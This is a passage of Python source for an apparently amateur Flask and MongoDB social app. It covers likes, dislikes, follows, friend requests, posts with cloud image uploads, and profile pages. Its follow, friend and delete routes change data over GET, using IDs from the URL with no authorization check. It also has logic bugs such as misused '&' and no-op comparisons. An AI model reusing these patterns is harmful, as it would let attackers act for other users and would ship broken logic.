      total_count1 = reactant.count_documents({'UUID': int(post_id)})
      yupper1 = {'$set': {"likes": int(total_count1), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':int(post_id)},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper1)
      print('Added Like')
    if likes == None:
      reactant.delete_one({
        'Liked_post_ID': postings['_id'],
        'Liked_by': users['_id'],
        'UUID': int(post_id),
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2 +HeartsINPOST
      total_cnt = reactant.count_documents({'UUID': int(post_id)})
      guppie = {'$set': {"likes": int(total_cnt), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':int(post_id)},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},guppie)
      print('like already exist')
    elif likes == 0 & Dislike == 0:
      reactant.insert_one({
        'Liked_post_ID': postings['_id'],
        'Liked_by': users['_id'],
        'UUID': int(post_id),
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2+HeartsINPOST
      total_count = reactant.count_documents({'UUID': int(post_id)})
      yupper = {'$set': {"likes": int(total_count), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':int(post_id)},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper)
    autobots1 = reactant.find()
    for botz1 in autobots1:
      pass
    return redirect("/home")


  ##############################################


  ##############################################
  @app.route('/disser/<dislike_me>', methods=["GET"])
  def dislikes_me(dislike_me):
    SUMTOTAL = 0
    SUMTOTAL2 = 0

    uu_id = session['user']
    collection = tets_db.post
    collection1 = tets_db.user
    reactant = tets_db.reaction
    Hearts = tets_db.Heart
    get_Tha_post = collection.find({'postIdentifier': str(dislike_me)})
    get_current_user = collection1.find({'uuID': str(uu_id)})
    for users in get_current_user:
      print(users)
    for postings in get_Tha_post:
      print(postings)
    try:
      FindHearts= Hearts.find({"HeartID":postings['INT_ID']})
      HeartsINPOST = len(list(FindHearts))
    except:
      HeartsINPOST = 0
    verify_like_button = reactant.find({
      'Dislike_Post_ID': postings['_id'],
      'Disliked_By': users['_id'],
      'UUID': postings['INT_ID'],
      'PERM_ID': postings['PERM_ID']
    })

    Get_user_Like_post = reactant.find({
      'Liked_post_ID': postings['_id'],
      'Liked_by': users['_id'],
      'UUID': postings['INT_ID'],
      'PERM_ID': postings['PERM_ID']
    })

    if len(list(Get_user_Like_post)) == 0:
      Likes = 0
      print('No Likes found')
    else:
      Likes = None
      print('Likes found')
    if len(list(verify_like_button)) == 0:
      Dislikes = 0
      print("has no value")
    else:
      Dislikes = None
    if Likes == None:
      reactant.delete_one({
        'Liked_post_ID': postings['_id'],
        'Liked_by': users['_id'],
        'UUID': postings['INT_ID'],
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2+HeartsINPOST
      total_count = reactant.count_documents({'Liked_post_ID': postings['_id']})
      yupper = {'$set': {"likes": int(total_count), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':postings['INT_ID']},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper)
      print("removed like post")
      reactant.insert_one({
        'Dislike_Post_ID': postings['_id'],
        'Disliked_By': users['_id'],
        'UUID': postings['INT_ID'],
        'PERM_ID': postings['PERM_ID']
      })
      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2+HeartsINPOST
      total_count1 = reactant.count_documents({
        'PERM_ID': postings['PERM_ID'],
        'Dislike_Post_ID': postings['_id']
      })
      yupper1 = {'$set': {"dislikes": int(total_count1), 'reacs': ripple}}
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper1)
      print('Added dislike')
    if Dislikes == None:
      reactant.delete_one({
        'Dislike_Post_ID': postings['_id'],
        'Disliked_By': users['_id'],
        'UUID': postings['INT_ID'],
        'PERM_ID': postings['PERM_ID']
      })

      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2+HeartsINPOST
      total_cnt2 = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      guppie2 = {'$set': {"dislikes": total_cnt2, 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':postings['INT_ID']},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            guppie2)
      return redirect('/home')
    if Dislikes == 0 & Likes == 0:
      reactant.insert_one({
        'Dislike_Post_ID': postings['_id'],
        'Disliked_By': users['_id'],
        'UUID': postings['INT_ID'],
        'PERM_ID': postings['PERM_ID']
      })

      SUMTOTAL = reactant.count_documents({'Dislike_Post_ID': postings['_id']})
      SUMTOTAL2 = reactant.count_documents({'Liked_post_ID': postings['_id']})
      ripple = SUMTOTAL + SUMTOTAL2+HeartsINPOST
      total_count1 = reactant.count_documents(
        {'Dislike_Post_ID': postings['_id']})
      yupper1 = {'$set': {"dislikes": int(total_count1), 'reacs': ripple}}
      HeartLikes = {'$set': { 'reacs': ripple}}
      Hearts.update_many({'HeartID':postings['INT_ID']},HeartLikes)
      collection.update_one({'postIdentifier': postings['postIdentifier']},
                            yupper1)
      print('Added dislike')

    autobots = reactant.find()
    for botz in autobots:
      pass
    return redirect('/home')


  ##############################################



  ##############################################
  @app.route('/Follow/<FollowID>/<FollowedByID>/<UNIVERSAL_INT>', methods=["GET"])
  def Follow(FollowID,FollowedByID,UNIVERSAL_INT):
    Follow = tets_db.Follow
    Users = tets_db.user
    FollowIDVaidate = Follow.find({"FollowedUser":str(FollowID),"FollowedByID":str(FollowedByID),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
    if len(list(FollowIDVaidate)) ==0:
      FollowIDVaidate = False
      print("TEST")
    else:
      FollowIDVaidate=True
      print("TESTer")
    if FollowIDVaidate == False:
      Follow.insert_one({"FollowedUser":str(FollowID),"FollowedByID":str(FollowedByID),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
      FollowCnt = Follow.count_documents({"FollowedUser":str(FollowID)})
      FollowingCnt = Follow.count_documents({"FollowedByID":str(FollowedByID)})
      SetFollowers = {"$set":{"Followers":int(FollowCnt)}}
      Users.update_one({"PERM_ID":str(FollowID)},SetFollowers)
      SetFollowing = {"$set":{"Following":int(FollowingCnt)}}
      Users.update_one({"PERM_ID":str(FollowedByID)},SetFollowing)
    if FollowIDVaidate == True:
      Follow.delete_one({"FollowedUser":str(FollowID),"FollowedByID":str(FollowedByID),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
      FollowCnt = Follow.count_documents({"FollowedUser":str(FollowID)})
      FollowingCnt = Follow.count_documents({"FollowedByID":str(FollowedByID)})
      SetFollowers = {"$set":{"Followers":int(FollowCnt)}}
      Users.update_one({"PERM_ID":str(FollowID)},SetFollowers)
      SetFollowing = {"$set":{"Following":int(FollowingCnt)}}
      Users.update_one({"PERM_ID":str(FollowedByID)},SetFollowing)
    return redirect("/home")

  ##############################################
  #Preference = tets_db.Preferences

  ##############################################
  @app.route('/Friend/<UserFriended>/<FriendedBy>/<UNIVERSAL_INT>', methods=["GET"])
  def Friend(UserFriended,FriendedBy,UNIVERSAL_INT):
    Users = tets_db.user
    Friend = tets_db.Friends
    Preference = tets_db.Preferences


    
    print("TEST")
    FindPrefrence = Preference.find({"UserID":str(UserFriended)}) 
    for Prefrences in FindPrefrence:
      pass
    UserFriendedUser = Users.find({"PERM_ID":str(UserFriended)})
    for Userz in UserFriendedUser:
      pass
    UserFriendedUser1 = Users.find({"PERM_ID":str(FriendedBy)})
    for Userz1 in UserFriendedUser1:
      pass
    Username = Userz1['username']
    x = Userz['email']
    if Prefrences['RequestFriends'] == True:
      msg['subject'] = 'Friend Request'
      msg['From'] = EMAIL_ADDRESS
      msg['To'] = x

      msg.set_content(f"""
      <div style="color:red;"> 
      {Username}, has sent you friend request.
      </div>""", subtype='html')
      with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
          smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
          smtp.send_message(msg)
      InsertValue = {"UserID":str(UserFriended),"Type":"Friend Request","Submitted_By":str(FriendedBy)}
      Preference.insert_one(InsertValue)
      Friend.insert_one({"UserFriended":str(UserFriended),"FriendedBy":str(FriendedBy),"UNIVERSAL_INT":int(UNIVERSAL_INT),"Pending_Status":False})
    elif Prefrences['RequestFriends'] == False:
      GetFriends = Friend.find({"UserFriended":str(UserFriended),"FriendedBy":str(FriendedBy),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
      if len(list(GetFriends)) ==0:
        GetFriends = False
      else:
        GetFriends=True
      if GetFriends == False:
        Friend.insert_one({"UserFriended":str(UserFriended),"FriendedBy":str(FriendedBy),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
        Friends = Friend.count_documents({"UserFriended":str(UserFriended)})
        SetFollowing = {"$set":{"Friends":int(Friends)}}
        Users.update_one({"PERM_ID":str(UserFriended)},SetFollowing)
      if GetFriends == True:
        Friend.delete_one({"UserFriended":str(UserFriended),"FriendedBy":str(FriendedBy),"UNIVERSAL_INT":int(UNIVERSAL_INT)})
        Friends = Friend.count_documents({"UserFriended":str(UserFriended)})
        SetFollowing = {"$set":{"Friends":int(Friends)}}
        Users.update_one({"PERM_ID":str(UserFriended)},SetFollowing)
    return redirect("/home")
  ##############################################


  ##############################################
  @app.route('/post', methods=["GET", "POST"])
  def User_post():
    IsValid = True
    tag = None
    picur_me = None
    pics = None
    rag = False
    text = None
    url_getty = None
    uu_id = session['user']
    inuq_id = uuid.uuid4()
    collection = tets_db.post
    Tags = tets_db.Tagz
    collection1 = tets_db.user
    PostPics = tets_db.PostPics
    poster = collection1.find({"uuID": str(uu_id)})
    for documents in poster:
      print(documents)
    INT_ENTER = random.randrange(1000, 10000000000000000)  
    if request.method == 'POST':
      text = request.form.get('text')
      Category = request.form.get('Category')
      print("THIS IS TEXT ONE",Category)
      tag = request.form.get("Tag")
      try:
        if tag != None and tag != "":
          print('befor split',tag)
          tag = tag.split(' ')
          print('After split',tag)
          for tagzz in tag:
            get_all =Tags.find({"Tag":str(tagzz)})
          for docs in get_all:
            print(docs)
          TagID = random.randrange(1000, 10000000000000000)
          try:
            if tagzz == docs['Tag']:
                print("Equal")
                Tags.insert_one({"postIdentifier": str(inuq_id),'PERM_ID':documents['PERM_ID'],"Tag":str(tagzz),"TagID":int(docs['TagID'])})
          except:
            docs = None
            Tags.insert_one({"postIdentifier": str(inuq_id),'PERM_ID':documents['PERM_ID'],"Tag":str(tagzz),"TagID":int(TagID)})
      except:
        tagzz = None
        
      if request.files.getlist('fileholder'):
          picur_me = request.files.getlist('fileholder')
          for pics in picur_me:
              print(pics)
              pic_filename = secure_filename(pics.filename)
              if pic_filename != '':#this prevents invalid files from being uploasded to the cloud
                  pic_name = str(uuid.uuid1()) + "_" + pic_filename
                  post_picure = pic_name
                  pics.save(os.path.join(app.config['IMAGE_UPLOADS'], pic_name))
                  print(post_picure)
                  blob=bucket.blob('Post-Pics/'+post_picure)
                  filename1=post_picure 
                  blob.upload_from_filename('WaliwoPlus/static/statics/'+filename1)
                      # blob.delete()
                  blob.make_public()
                  tun = blob.public_url
                  print('THIS IS LINK',tun)
                  INT_ENTER = random.randrange(1000, 10000000000000000)   
                  PostPics.insert_one({'PERM_ID':documents['PERM_ID'],'postIdentifier':str(inuq_id),"Picure":tun,'INT_ID': int(INT_ENTER),"IMG-NAME":post_picure})
                  os.remove("WaliwoPlus/static/statics/" + post_picure)
              elif pic_filename == '':
                  break
      if len(text) == 0 and pic_filename == '':
        IsValid = False
        return render_template('post.html',IsValid=IsValid)
      if len(text) > 0 and pic_filename != '':
        dt_local = datetime.datetime.now(pytz.utc)
        dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
        GetTime = dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p")
        print(GetTime)
        GetTime = str(GetTime)
        print(GetTime)
        format = "/%m/%d/%y %I:%M:%S %p"
        try:
          collection.insert_one({'post': text, "Post_Created": dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p"),"STR-Time":datetime.datetime.strptime(GetTime, format), 'Foreign_key': documents['profilePic'], 'username': documents['username'], 'uuID': documents['_id'], 'postIdentifier': str(inuq_id), 'PERM_ID': documents['PERM_ID'], 'dislikes': 0, 'likes': 0, 'INT_ID': int(INT_ENTER),'Clicks': 0, 'reacs': 0, 'comments': 0,'Hearts':0,"PIC_PLACEHOLDER":tun,"IMG-NAME":post_picure,"Category":Category})
        except:
          badPic = False
          collection.insert_one({'post': text, "Post_Created": dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p"),"STR-Time":datetime.datetime.strptime(GetTime, format), 'Foreign_key': documents['profilePic'], 'username': documents['username'], 'uuID': documents['_id'], 'postIdentifier': str(inuq_id), 'PERM_ID': documents['PERM_ID'], 'dislikes': 0, 'likes': 0, 'INT_ID': int(INT_ENTER), 'Clicks': 0, 'reacs': 0, 'comments': 0,'Hearts':0,"PIC_PLACEHOLDER":badPic,"Category":Category})
        return redirect("/home")
      if pic_filename != '':
        dt_local = datetime.datetime.now(pytz.utc)
        dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
        GetTime = dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p")
        print(GetTime)
        GetTime = str(GetTime)
        print(GetTime)
        format = "/%m/%d/%y %I:%M:%S %p"
        collection.insert_one({"Post_Created": dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p"),"STR-Time":datetime.datetime.strptime(GetTime, format), 'Foreign_key': documents['profilePic'], 'username': documents['username'], 'uuID': documents['_id'], 'postIdentifier': str(inuq_id), 'PERM_ID': documents['PERM_ID'], 'dislikes': 0, 'likes': 0, 'INT_ID': int(INT_ENTER), 'Clicks': 0, 'reacs': 0, 'comments': 0,'Hearts':0,"PIC_PLACEHOLDER":tun,"IMG-NAME":post_picure,"Category":Category})
        return redirect("/home")
      if len(text) > 0:
        dt_local = datetime.datetime.now(pytz.utc)
        dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
        GetTime = dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p")
        print(GetTime)
        GetTime = str(GetTime)
        print(GetTime)
        format = "/%m/%d/%y %I:%M:%S %p"
        collection.insert_one({'post': text, "Post_Created":dt_us_central.strftime("/%m/%d/%y %I:%M:%S %p"),"STR-Time":datetime.datetime.strptime(GetTime, format), 'Foreign_key': documents['profilePic'], 'username': documents['username'], 'uuID': documents['_id'], 'postIdentifier': str(inuq_id), 'PERM_ID': documents['PERM_ID'], 'dislikes': 0, 'likes': 0, 'INT_ID': int(INT_ENTER), 'Clicks': 0, 'reacs': 0, 'comments': 0,'Hearts':0,"Category":Category})
        return redirect("/home")
            
    
      
              
      
            
            

      picur_me = None  
      # for f in request.files.getlist('fileholder'):
      #     pic_filename = secure_filename(f.filename)
      #     pic_name = str(uuid.uuid1()) + "_" + pic_filename
      #     post_picure = pic_name
      #     f.save(os.path.join(app.config['IMAGE_UPLOADS'], pic_name))
      #     li = list(post_picure.split(" "))
      #     print(f)
      #     for i in range(3):
      #       print("test")
      #       storage.child('Post_Pic/' + post_picure).put("WaliwoPlus/static/statics/" +post_picure)
      #       url_getty = storage.child('Post_Pic/' + post_picure).get_url(None)
      #       print(url_getty)
      #     os.remove("WaliwoPlus/static/statics/" + post_picure) 
      
      # for tagzz in tag:
      #   get_all =Tags.find({"Tag":str(tagzz)})
      # for docs in get_all:
      #   print(docs)
      # TagID = random.randrange(1000, 10000000000000000)
      # try:
      #   if tagzz == docs['Tag']:
      #       print("Equal")
      #       Tags.insert_one({"postIdentifier": str(inuq_id),'PERM_ID':documents['PERM_ID'],"Tag":str(tagzz),"TagID":int(docs['TagID'])})
      # except:
      #   docs = None
      #   Tags.insert_one({"postIdentifier": str(inuq_id),'PERM_ID':documents['PERM_ID'],"Tag":str(tagzz),"TagID":int(TagID)})
        
          
        
      

        # print("if this ioweks ")

        #cursor = collection.find({"profilePic": "f7cole89db89-8a7a-11ed-82bd-009337e4b91a_unnamed.jpg"})
    return render_template('post.html',IsValid=IsValid)


  ##############################################

  ##############################################
  @app.route('/Delete/<postID>/<PermID>/<ID>/', methods=['GET','POST'])
  def DeleteImageData(postID,PermID,ID):
      testings = False
      ImageNamePlus = None
      test = None
      PostPics = tets_db.PostPics
      collection = tets_db.post
      Hearts = tets_db.Heart
      dt_local = datetime.datetime.now(pytz.utc)
      dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
      ID = int(ID)
      twitch = collection.find({ 'postIdentifier': postID,"PERM_ID":PermID})
      for twitches in twitch:
          print("tested this corrected")
  
      print("IS ON POST ")
      tester=PostPics.find({"postIdentifier":postID,"PERM_ID":PermID,"INT_ID":ID})
      for test in tester:
          print("Tested ")
          ImageNamePlus = test['IMG-NAME']
          blob=bucket.blob('Post-Pics/'+str(ImageNamePlus))
          blob.delete()
          HeartLikes = {'$set': { 'PIC_PLACEHOLDER':None}}
          Hearts.update_one({'HeartID':twitches['INT_ID']},HeartLikes)
          UserPostSet = { '$set': {'Edited': dt_us_central.strftime("/%a/%d/%y %I:%M:%S %p"),"PIC_PLACEHOLDER":None,"IMG-NAME":None } }
          collection.update_one( { 'PERM_ID': PermID, 'postIdentifier': postID }, UserPostSet)
          
          PostPics.delete_one({"postIdentifier":postID,"PERM_ID":PermID,"INT_ID":ID})
      testME=PostPics.find({"postIdentifier":postID,"PERM_ID":PermID})    
      for testings in testME:
          print("Got tested")
      if testings:
        HeartLikes = {'$set': { 'PIC_PLACEHOLDER': testings['Picure']}}
        Hearts.update_one({'HeartID':twitches['INT_ID']},HeartLikes)
        UserPostSet = { '$set': {'Edited': dt_us_central.strftime("/%a/%d/%y %I:%M:%S %p"),"PIC_PLACEHOLDER":testings['Picure'],"IMG-NAME":testings['IMG-NAME'] } }
        collection.update_one( { 'PERM_ID': PermID, 'postIdentifier': postID }, UserPostSet)
      return redirect("/home")
  ##############################################
    
  ##############################################
  @app.route('/Profile/@<username>/<PERM_ID>/', methods=["GET"])
  def Profile(username, PERM_ID):
    collection = tets_db.post
    collection1 = tets_db.user
    uu_id = session['user']
    Hearts = tets_db.Heart
    FindHearts = False
    postings=False
    uu_id = str(uu_id)
    try:  #if user doesnt have post this will set the default to Null so it will have a value set
      Posters = False
      PostFinder = collection.find({'PERM_ID': PERM_ID})
      FindPost = collection.find({'PERM_ID': PERM_ID})
      for Posters in FindPost:
        print("Tested")
    except:
      Posters = False#3a2c6c9e-e166-4ce4-8325-a19ae73ffbaf
      FindPost = False#a7d22b11-04df-4394-8ed2-b2f728fc6bc5
      PostFinder = False#e985f3f5-5958-4936-82f3-d6a525eb4400

    FindUser = collection1.find({'PERM_ID': PERM_ID, 'uuID': uu_id})
    for Users in FindUser:
      print("Test Works")

      
    
    
    return render_template('UserNav/User_profile_Mixin.html',
                          FindUser=Users,
                          PostFinder=PostFinder,Posters=Posters,Users=Users)


  ##############################################


  ##############################################
  @app.route('/Inbox/@<username>/<PERM_ID>/', methods=["GET","POST"])
  def Inbox(username,PERM_ID):
    Items = None
    things = None
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    Inbox = tets_db.Inbox
    Friend = tets_db.Friends
    collection1 = tets_db.user
    InboxCenter = Inbox.find({":UserID":str(PERM_ID),"Type":"Friend Request"})
    try:
      for Items in InboxCenter:
        pass
      ForSubmittedUser = collection1.find({"PERM_ID":Items['Submitted_By']})
      for things in ForSubmittedUser:
        pass
    
    except:
      Items = None
      things = None
    return render_template("Inbox.html",Items=Items,things=things)
    ##############################################################
  ##############################################


  ##############################################
  @app.route('/Profile/@<username>/<PERM_ID>/Heart', methods=["GET","POST"])
  def UserHearts(username,PERM_ID):
    LocalUser = None
    SameUser = False
    LocalProfile = False
    findHearts = False
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    Follow = tets_db.Follow
    Friends = tets_db.Friends
    Hearts = tets_db.Heart
    Preference = tets_db.Preferences
    
    uu_id = str(uu_id)
    Preferd = Preference.find({"UserID":PERM_ID})
    for Items in Preferd:
      print("Got Em")
    BlockFollowers = None
    BlockFriends = None

    if Items['BlockFollowers'] == False:
      BlockFollowers == False
    elif Items['BlockFollowers'] == True:
      BlockFollowers == True
    if Items['BlockFriends'] == False:
      BlockFriends == False
    elif Items['BlockFriends'] == True:
      BlockFriends == True
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    findHearts = Hearts.find({"Hearted-BY": Users['PERM_ID']})
    FilterOnlyFollowers = False
    FilterOnlyFriends = False
    
    if uu_id != 'GUEST_USER':
      FindLocalUser = collection1.find({'uuID': str(uu_id)})
      for LocalUser in FindLocalUser:
        print("GotUser")
      try:
        FindLocalUser = collection1.find({'uuID': str(uu_id)})
        for LocalUser in FindLocalUser:
          print("GotUser")
        if LocalUser['PERM_ID'] == PERM_ID:
          LocalProfile = True
      except:
        LocalProfile = False
      if LocalUser['PERM_ID'] == Users['PERM_ID']:
          SameUser = True
      if Items['Hide_Followers'] == True:
        FilterOnlyFollowers = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
        if len(list(FilterOnlyFollowers)) == 0:
          print("user is not following you")
          FilterOnlyFollowers = False
        elif  len(list(FilterOnlyFollowers)) == 1:
          FilterOnlyFollowers =True
      if Items['Hide_Friends'] == True:
        FilterOnlyFriends = Friends.find({"FriendedBy":LocalUser['PERM_ID'],"UserFriended":str(PERM_ID)})
        if len(list(FilterOnlyFriends)) == 0:
          print("user is not Friends with you")
          FilterOnlyFriends = False
        elif  len(list(FilterOnlyFriends)) == 1:
          FilterOnlyFriends =True
    Follows =False
    try:
      FollowId = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
      for Follows in FollowId:
        pass
    except:
      Follows = False
    Followings = False
    



    try:
      FindFollowUser = collection1.find({'PERM_ID': str(PERM_ID)})
      for FollowedUsers in FindFollowUser:
        pass
      try:
        forFriends = Friends.find({"UserFriended":FollowedUsers['PERM_ID'],"FriendedBy":LocalUser['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
        if len(list(forFriends))==0:
          forFriends = False
        else:
          forFriends = True
      except:
        forFriends =None
      FollowedBy = Follow.find({"FollowedByID":FollowedUsers['PERM_ID'],"FollowedUser":LocalUser['PERM_ID'],"UNIVERSAL_INT":FollowedUsers['UNIVERSAL_INT']})
      VerifyFollow = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":FollowedUsers['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
      for Followings in FollowedBy:
        Followings = True
      if len(list(VerifyFollow)) ==1:
        print("IS ONE")
        Followings = False
      
    except:
      Followings=False
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    Post = None
    try:  
      PostFinder = collection.find({'PERM_ID': str(PERM_ID)})
      for Post in PostFinder:
        print("I")
    except:
      PostFinder = None
      Post = None
    return render_template("UserProfilePages/UserHeart.html",Post=Post,LocalProfile=LocalProfile,Users=Users,BlockFollowers=BlockFollowers,BlockFriends=BlockFriends,HeartedPost=findHearts,SameUser=SameUser,LocalUser=LocalUser,Follows=Follows,Followings=Followings,forFriends=forFriends,Items=Items,uu_id=uu_id,FilterOnlyFollowers=FilterOnlyFollowers,FilterOnlyFriends=FilterOnlyFriends)
  #############################################################v"UserProfilePages/UserHeart.html"
  @app.route('/Profile/@<username>/<PERM_ID>/Post', methods=["GET","POST"])
  def UserPost(username,PERM_ID):

    LocalUser = None
    SameUser = False
    LocalProfile = False
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    Follow = tets_db.Follow
    Friends = tets_db.Friends
    Preference = tets_db.Preferences
    uu_id = str(uu_id)
    Preferd = Preference.find({"UserID":PERM_ID})
    for Items in Preferd:
      print("Got Em")
    BlockFollowers = False
    BlockFriends = False
    x = Items['BlockFollowers']
    y = Items['BlockFriends']
    print(x,y)
    if x == False:
      x == False
    elif x == True:
      x == True
    if y == False:
      y == False
    elif y == True:
      y == True

    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    FilterOnlyFollowers = False
    FilterOnlyFriends = False
    
    if uu_id != 'GUEST_USER':
      FindLocalUser = collection1.find({'uuID': str(uu_id)})
      for LocalUser in FindLocalUser:
        print("GotUser")
      try:
        FindLocalUser = collection1.find({'uuID': str(uu_id)})
        for LocalUser in FindLocalUser:
          print("GotUser")
        if LocalUser['PERM_ID'] == PERM_ID:
          LocalProfile = True
      except:
        LocalProfile = False
      if LocalUser['PERM_ID'] == Users['PERM_ID']:
          SameUser = True
      if Items['Hide_Followers'] == True:
        FilterOnlyFollowers = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
        if len(list(FilterOnlyFollowers)) == 0:
          print("user is not following you")
          FilterOnlyFollowers = False
        elif  len(list(FilterOnlyFollowers)) == 1:
          FilterOnlyFollowers =True
      if Items['Hide_Friends'] == True:
        FilterOnlyFriends = Friends.find({"FriendedBy":LocalUser['PERM_ID'],"UserFriended":str(PERM_ID)})
        if len(list(FilterOnlyFriends)) == 0:
          print("user is not Friends with you")
          FilterOnlyFriends = False
        elif  len(list(FilterOnlyFriends)) == 1:
          FilterOnlyFriends =True
    Follows =False
    try:
      FollowId = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
      for Follows in FollowId:
        pass
    except:
      Follows = False
    Followings = False
    



    try:
      FindFollowUser = collection1.find({'PERM_ID': str(PERM_ID)})
      for FollowedUsers in FindFollowUser:
        pass
      try:
        forFriends = Friends.find({"UserFriended":FollowedUsers['PERM_ID'],"FriendedBy":LocalUser['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
        if len(list(forFriends))==0:
          forFriends = False
        else:
          forFriends = True
      except:
        forFriends =None
      FollowedBy = Follow.find({"FollowedByID":FollowedUsers['PERM_ID'],"FollowedUser":LocalUser['PERM_ID'],"UNIVERSAL_INT":FollowedUsers['UNIVERSAL_INT']})
      VerifyFollow = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":FollowedUsers['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
      for Followings in FollowedBy:
        Followings = True
      if len(list(VerifyFollow)) ==1:
        print("IS ONE")
        Followings = False
      
    except:
      Followings=False
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    Post = None
    try:  
      PostFinder = collection.find({'PERM_ID': str(PERM_ID)})
      for Post in PostFinder:
        print("I")
    except:
      PostFinder = None
      Post = None
    return render_template("UserProfilePages/UserContent.html",Post=Post,LocalProfile=LocalProfile,BlockFollowers=x,BlockFriends=y,Users=Users,SameUser=SameUser,LocalUser=LocalUser,Follows=Follows,Followings=Followings,forFriends=forFriends,Items=Items,uu_id=uu_id,FilterOnlyFollowers=FilterOnlyFollowers,FilterOnlyFriends=FilterOnlyFriends)
  #############################################################UserProfilePages/UserPics.html  UserPics
  @app.route('/Profile/@<username>/<PERM_ID>/Pics', methods=["GET","POST"])
  def UserPics(username,PERM_ID):
    LocalUser = None
    SameUser = False
    LocalProfile = False
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    Follow = tets_db.Follow
    Friends = tets_db.Friends
    Preference = tets_db.Preferences
    uu_id = str(uu_id)
    Preferd = Preference.find({"UserID":PERM_ID})
    for Items in Preferd:
      print("Got Em")
    BlockFollowers = None
    BlockFriends = None

    if Items['BlockFollowers'] == False:
      BlockFollowers == False
    elif Items['BlockFollowers'] == True:
      BlockFollowers == True
    if Items['BlockFriends'] == False:
      BlockFriends == False
    elif Items['BlockFriends'] == True:
      BlockFriends == True
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    FilterOnlyFollowers = False
    FilterOnlyFriends = False
    
    if uu_id != 'GUEST_USER':
      FindLocalUser = collection1.find({'uuID': str(uu_id)})
      for LocalUser in FindLocalUser:
        print("GotUser")
      try:
        FindLocalUser = collection1.find({'uuID': str(uu_id)})
        for LocalUser in FindLocalUser:
          print("GotUser")
        if LocalUser['PERM_ID'] == PERM_ID:
          LocalProfile = True
      except:
        LocalProfile = False
      if LocalUser['PERM_ID'] == Users['PERM_ID']:
          SameUser = True
      if Items['Hide_Followers'] == True:
        FilterOnlyFollowers = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
        if len(list(FilterOnlyFollowers)) == 0:
          print("user is not following you")
          FilterOnlyFollowers = False
